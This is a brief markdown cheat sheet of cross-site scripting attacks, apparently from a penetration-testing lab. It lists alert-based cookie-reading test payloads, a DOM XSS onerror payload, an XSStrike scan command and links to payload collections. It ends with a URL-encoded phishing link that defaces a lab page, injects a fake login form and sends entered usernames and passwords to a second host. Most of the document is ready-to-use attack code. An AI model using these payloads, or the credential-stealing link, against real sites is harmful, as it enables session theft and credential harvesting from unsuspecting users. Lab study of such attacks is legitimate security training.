# XSS
## Testing for XSS

```javascript
<script>alert(window.origin)</script>
```
```javascript
<script>alert(document.cookie)</script>
```

## DOM XSS
```javascript
<img src="" onerror=alert(document.cookie)>
```
## Automated Discovery
```zsh
python3 xsstrike.py -u "http://<IP:PORT>/<page>.php?<param>=<value>" 
```

## XSS Payloads

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://github.com/payloadbox/xss-payload-list

## Phising link that decases webpage and has a credential stealer
http://10.129.108.114/phishing/index.php?url=document.write(%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.16.10:80/index.php%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27)%3Bdocument.getElementById(%27urlform%27).remove()%3B
